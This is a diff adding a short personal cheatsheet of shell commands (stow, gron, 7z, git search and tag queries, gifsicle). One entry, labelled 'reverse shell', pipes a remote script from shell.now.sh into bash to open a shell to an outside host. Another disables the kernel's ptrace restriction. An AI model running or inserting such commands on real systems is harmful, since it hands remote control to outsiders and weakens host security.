@@ -1,0 +1,27 @@
+% commands 
+
+# stow
+stow <dir> --ignore=.directory --target=$HOME
+$ dir: ls -d -- */
+
+# enable ptrace
+echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope
+
+# flatten json
+gron test.json
+
+# reverse shell
+curl https://shell.now.sh/yukari.farseerfc.me:13337 | bash
+
+# https://github.com/kimci86/bkcrack/issues/9#issuecomment-608416330
+# list metadata about the file in archive
+7z l -slt <archive> <path/to/file>
+
+# git search
+git log -S <text> <path>
+
+# git query tag
+git tag --contains=<commit>
+
+# gif compress
+gifsicle -i <input> -O3 --colors 256 -o <output>
